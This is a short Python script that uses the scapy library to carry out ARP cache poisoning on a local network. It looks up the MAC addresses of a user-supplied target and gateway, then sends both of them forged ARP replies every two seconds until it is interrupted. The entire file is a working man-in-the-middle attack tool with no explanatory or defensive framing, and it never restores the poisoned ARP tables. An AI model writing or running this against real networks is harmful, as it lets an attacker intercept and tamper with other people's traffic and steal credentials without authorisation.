from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, sendp
import time


def get_mac(ip: str):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
    answered = srp(packet, timeout=3, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc

    return None


def arp_poison(target_ip: str, gateway_ip: str):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        print("Could not find target MAC.")
        return

    if not gateway_mac:
        print("Could not find gateway MAC.")
        return

    print(f"Target MAC: {target_mac}")
    print(f"Gateway MAC: {gateway_mac}")
    print("Sending ARP poison packets... Press CTRL+C to stop.")

    packet_to_target = (
        Ether(dst=target_mac)
        / ARP(
            op=2,
            psrc=gateway_ip,
            pdst=target_ip,
            hwdst=target_mac
        )
    )

    packet_to_gateway = (
        Ether(dst=gateway_mac)
        / ARP(
            op=2,
            psrc=target_ip,
            pdst=gateway_ip,
            hwdst=gateway_mac
        )
    )

    try:
        while True:
            sendp(packet_to_target, verbose=False)
            sendp(packet_to_gateway, verbose=False)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\nStopping attack.")


if __name__ == "__main__":
    target = input("Target IP: ").strip()
    gateway = input("Gateway IP: ").strip()

    arp_poison(target, gateway)